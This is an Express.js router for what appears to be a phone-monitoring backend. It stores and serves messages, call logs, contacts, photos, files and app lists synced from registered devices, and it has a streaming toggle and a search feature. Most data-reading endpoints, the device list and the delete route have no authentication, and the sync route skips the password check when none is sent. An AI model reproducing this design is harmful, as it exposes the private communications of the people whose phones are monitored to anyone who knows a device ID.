// const express = require('express');
// const Device = require('../models/Device');
// const { registerOrUpdateDevice, setStreaming, updatePassword } = require('../services/deviceService');

// const router = express.Router();

// router.get('/', async (req, res, next) => {
//   try {
//     const devices = await Device.find({})
//       .sort({ updatedAt: -1 })
//       .limit(100);

//     return res.json({
//       count: devices.length,
//       devices: devices.map((device) => device.toPublicJSON()),
//     });
//   } catch (error) {
//     return next(error);
//   }
// });

// router.post('/register', async (req, res, next) => {
//   try {
//     const { deviceId, password } = req.body;
//     if (!deviceId || !password) {
//       return res.status(400).json({ error: 'deviceId and password are required' });
//     }

//     const device = await registerOrUpdateDevice(req.body, null);
//     return res.status(201).json({
//       success: true,
//       device: device.toPublicJSON(),
//     });
//   } catch (error) {
//     if (error.message === 'Invalid device password') {
//       return res.status(401).json({ error: error.message });
//     }
//     return next(error);
//   }
// });

// router.get('/:deviceId/status', async (req, res, next) => {
//   try {
//     const device = await Device.findOne({ deviceId: req.params.deviceId });
//     if (!device) {
//       return res.status(404).json({ error: 'Device not found' });
//     }
//     return res.json(device.toPublicJSON());
//   } catch (error) {
//     return next(error);
//   }
// });

// router.get('/:deviceId/data', async (req, res, next) => {
//   try {
//     const device = await Device.findOne({ deviceId: req.params.deviceId });
//     if (!device) {
//       return res.status(404).json({ error: 'Device not found' });
//     }
//     return res.json({ deviceData: device.deviceData || {} });
//   } catch (error) {
//     return next(error);
//   }
// });

// router.post('/:deviceId/stream', async (req, res, next) => {
//   try {
//     const { password, isStreaming } = req.body;
//     const device = await Device.findOne({ deviceId: req.params.deviceId });
//     if (!device) {
//       return res.status(404).json({ error: 'Device not found' });
//     }

//     const valid = await device.verifyPassword(password);
//     if (!valid) {
//       return res.status(401).json({ error: 'Invalid password' });
//     }

//     await setStreaming(req.params.deviceId, Boolean(isStreaming));
//     const updated = await Device.findOne({ deviceId: req.params.deviceId });
//     return res.json({
//       success: true,
//       device: updated.toPublicJSON(),
//     });
//   } catch (error) {
//     return next(error);
//   }
// });

// router.post('/:deviceId/password', async (req, res, next) => {
//   try {
//     const { oldPassword, newPassword } = req.body;
//     if (!oldPassword || !newPassword) {
//       return res.status(400).json({ error: 'oldPassword and newPassword are required' });
//     }

//     const device = await updatePassword(req.params.deviceId, oldPassword, newPassword);
//     return res.json({
//       success: true,
//       device: device.toPublicJSON(),
//     });
//   } catch (error) {
//     if (error.message === 'Device not found') {
//       return res.status(404).json({ error: error.message });
//     }

//     if (error.message === 'Invalid device password') {
//       return res.status(401).json({ error: error.message });
//     }

//     return next(error);
//   }
// });

// router.post('/:deviceId/verify', async (req, res, next) => {
//   try {
//     const { password } = req.body;
//     const device = await Device.findOne({ deviceId: req.params.deviceId });
//     if (!device) {
//       return res.status(404).json({ error: 'Device not found' });
//     }

//     const valid = await device.verifyPassword(password);
//     if (!valid) {
//       return res.status(401).json({ error: 'Invalid password' });
//     }

//     return res.json({
//       valid: true,
//       device: device.toPublicJSON(),
//     });
//   } catch (error) {
//     return next(error);
//   }
// });

// module.exports = router;


const express = require('express');
const Device = require('../models/Device');
const { registerOrUpdateDevice, setStreaming, updatePassword } = require('../services/deviceService');

const router = express.Router();

function summarizeDeviceData(data = {}) {
  return {
    files: data.files?.length || 0,
    gallery: data.gallery?.length || 0,
    images: data.images?.length || 0,
    videos: data.videos?.length || 0,
    messages: data.messages?.length || 0,
    callLogs: data.callLogs?.length || 0,
    contacts: data.contacts?.length || 0,
    applications: data.applications?.length || 0,
  };
}

// GET /api/devices - List all devices
router.get('/', async (req, res, next) => {
  try {
    const devices = await Device.find({})
      .sort({ updatedAt: -1 })
      .limit(100);

    return res.json({
      success: true,
      count: devices.length,
      devices: devices.map((device) => device.toPublicJSON()),
    });
  } catch (error) {
    console.error('Error fetching devices:', error);
    return next(error);
  }
});

// POST /api/devices/register - Register a new device or update existing
router.post('/register', async (req, res, next) => {
  try {
    const { deviceId, password, deviceName, platform, appVersion } = req.body;

    console.log('Device registration request:', { deviceId, deviceName, platform, appVersion });

    if (!deviceId || !password) {
      return res.status(400).json({
        success: false,
        error: 'deviceId and password are required'
      });
    }

    const device = await registerOrUpdateDevice({
      deviceId,
      password,
      deviceName: deviceName || "Unknown Device",
      platform: platform || "android",
      appVersion: appVersion || "1.0"
    }, null);

    console.log('Device registered successfully:', deviceId);

    return res.status(201).json({
      success: true,
      device: device.toPublicJSON(),
    });
  } catch (error) {
    console.error('Device registration error:', error);
    if (error.message === 'Invalid device password') {
      return res.status(401).json({
        success: false,
        error: error.message
      });
    }
    return next(error);
  }
});

// GET /api/devices/:deviceId/status - Get device status
router.get('/:deviceId/status', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    console.log('Fetching device status for:', deviceId);

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    return res.json({
      success: true,
      device: device.toPublicJSON(),
    });
  } catch (error) {
    console.error('Error fetching device status:', error);
    return next(error);
  }
});

// GET /api/devices/:deviceId/data - Get device data (files, messages, etc.)
router.get('/:deviceId/data', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    console.log('Fetching device data for:', deviceId);

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    console.log('Device data API response:', {
      deviceId,
      summary: summarizeDeviceData(device.deviceData || {})
    });

    return res.json({
      success: true,
      deviceData: device.deviceData || {}
    });
  } catch (error) {
    console.error('Error fetching device data:', error);
    return next(error);
  }
});

// POST /api/devices/:deviceId/stream - Update streaming state
router.post('/:deviceId/stream', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const { password, isStreaming } = req.body;

    console.log('Update stream state request:', { deviceId, isStreaming });

    if (!password) {
      return res.status(400).json({
        success: false,
        error: 'Password is required'
      });
    }

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const valid = await device.verifyPassword(password);
    if (!valid) {
      return res.status(401).json({
        success: false,
        error: 'Invalid password'
      });
    }

    await setStreaming(deviceId, Boolean(isStreaming));
    const updated = await Device.findOne({ deviceId });

    console.log('Stream state updated:', { deviceId, isStreaming });

    return res.json({
      success: true,
      device: updated.toPublicJSON(),
    });
  } catch (error) {
    console.error('Error updating stream state:', error);
    return next(error);
  }
});

// POST /api/devices/:deviceId/password - Update device password
router.post('/:deviceId/password', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const { oldPassword, newPassword } = req.body;

    console.log('Password rotation request for:', deviceId);

    if (!oldPassword || !newPassword) {
      return res.status(400).json({
        success: false,
        error: 'oldPassword and newPassword are required'
      });
    }

    const device = await updatePassword(deviceId, oldPassword, newPassword);

    console.log('Password rotated successfully for:', deviceId);

    return res.json({
      success: true,
      device: device.toPublicJSON(),
    });
  } catch (error) {
    console.error('Error rotating password:', error);
    if (error.message === 'Device not found') {
      return res.status(404).json({
        success: false,
        error: error.message
      });
    }
    if (error.message === 'Invalid device password') {
      return res.status(401).json({
        success: false,
        error: error.message
      });
    }
    return next(error);
  }
});

// POST /api/devices/:deviceId/verify - Verify device credentials
router.post('/:deviceId/verify', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const { password } = req.body;

    console.log('Verification request for:', deviceId);

    if (!password) {
      return res.status(400).json({
        success: false,
        error: 'Password is required'
      });
    }

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const valid = await device.verifyPassword(password);
    if (!valid) {
      return res.status(401).json({
        success: false,
        error: 'Invalid password'
      });
    }

    return res.json({
      success: true,
      valid: true,
      device: device.toPublicJSON(),
    });
  } catch (error) {
    console.error('Error verifying device:', error);
    return next(error);
  }
});

// GET /api/devices/:deviceId/check - Quick check if device exists and is online
router.get('/:deviceId/check', async (req, res, next) => {
  try {
    const { deviceId } = req.params;

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.json({
        exists: false,
        online: false,
        streaming: false
      });
    }

    return res.json({
      exists: true,
      online: device.isOnline || false,
      streaming: device.isStreaming || false,
      deviceName: device.deviceName,
      lastSeen: device.lastSeen
    });
  } catch (error) {
    console.error('Error checking device:', error);
    return next(error);
  }
});

// DELETE /api/devices/:deviceId - Remove a device (for testing)
router.delete('/:deviceId', async (req, res, next) => {
  try {
    const { deviceId } = req.params;

    const result = await Device.deleteOne({ deviceId });
    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    console.log('Device deleted:', deviceId);

    return res.json({
      success: true,
      message: 'Device deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting device:', error);
    return next(error);
  }
});



router.post('/:deviceId/sync-data', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const { deviceData, password } = req.body;

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }

    if (password) {
      const valid = await device.verifyPassword(password);
      if (!valid) {
        return res.status(401).json({ success: false, error: 'Invalid password' });
      }
    }

    console.log('Sync device data request:', {
      deviceId,
      summary: summarizeDeviceData(deviceData || {})
    });

    device.deviceData = {
      ...device.deviceData,
      ...deviceData,
      lastUpdated: new Date(),
    };
    device.lastSeen = new Date();
    await device.save();

    console.log('Sync device data saved:', {
      deviceId,
      summary: summarizeDeviceData(device.deviceData || {})
    });

    res.json({ success: true, message: 'Data synced successfully' });
  } catch (error) {
    next(error);
  }
});

// NEW: Get files only
router.get('/:deviceId/files', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }
    res.json({ files: device.deviceData?.files || [] });
  } catch (error) {
    next(error);
  }
});

// NEW: Get gallery/images only
router.get('/:deviceId/gallery', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }
    res.json({
      gallery: device.deviceData?.gallery || [],
      images: device.deviceData?.images || [],
      videos: device.deviceData?.videos || []
    });
  } catch (error) {
    next(error);
  }
});

// NEW: Get messages
router.get('/:deviceId/messages', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }
    res.json({ messages: device.deviceData?.messages || [] });
  } catch (error) {
    next(error);
  }
});

// NEW: Get call logs
router.get('/:deviceId/call-logs', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }
    res.json({ callLogs: device.deviceData?.callLogs || [] });
  } catch (error) {
    next(error);
  }
});

// NEW: Get contacts
router.get('/:deviceId/contacts', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }
    res.json({ contacts: device.deviceData?.contacts || [] });
  } catch (error) {
    next(error);
  }
});

// NEW: Get applications
router.get('/:deviceId/apps', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }
    res.json({ applications: device.deviceData?.applications || [] });
  } catch (error) {
    next(error);
  }
});

// NEW: Search device data
router.post('/:deviceId/search', async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const { query, type } = req.body;

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }

    const deviceData = device.deviceData || {};
    let results = [];

    if (!type || type === 'files') {
      results.push(...(deviceData.files || []).filter(f =>
        f.name?.toLowerCase().includes(query.toLowerCase())
      ));
    }
    if (!type || type === 'gallery') {
      results.push(...(deviceData.gallery || []).filter(g =>
        g.name?.toLowerCase().includes(query.toLowerCase())
      ));
    }
    if (!type || type === 'messages') {
      results.push(...(deviceData.messages || []).filter(m =>
        m.text?.toLowerCase().includes(query.toLowerCase()) ||
        m.sender?.toLowerCase().includes(query.toLowerCase())
      ));
    }
    if (!type || type === 'contacts') {
      results.push(...(deviceData.contacts || []).filter(c =>
        c.name?.toLowerCase().includes(query.toLowerCase()) ||
        c.number?.includes(query)
      ));
    }

    res.json({ success: true, results, count: results.length });
  } catch (error) {
    next(error);
  }
});

module.exports = router;
